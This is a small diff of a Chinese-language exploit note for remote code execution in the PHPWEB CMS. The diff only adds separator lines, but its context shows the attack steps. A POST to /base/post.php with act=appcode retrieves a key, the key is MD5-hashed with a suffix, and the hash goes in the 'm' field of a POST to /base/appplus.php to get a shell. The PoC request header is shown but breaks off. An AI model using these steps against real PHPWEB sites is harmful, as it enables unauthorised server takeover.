@@ -1,5 +1,6 @@
 # PHPWEB RCE
 
+---
 #### 1.首先，先post发包获取值
 
 POST /base/post.php HTTP/1.1
@@ -19,6 +20,8 @@ act=appcode
 >    然后md5加密32位k的值+a  `504871bc9e70a836ae5ee70e69bde615a(504871bc9e70a836ae5ee70e69bde615+a` 加密之后的值为  `d950d53f648925e1c5ce8dc8bd6e8181`之后post包getshell ,post包m字段内容就是这个md5加密之后的值
 
 ### poc
+
+---
 
 ```
 POST /base/appplus.php HTTP/1.1
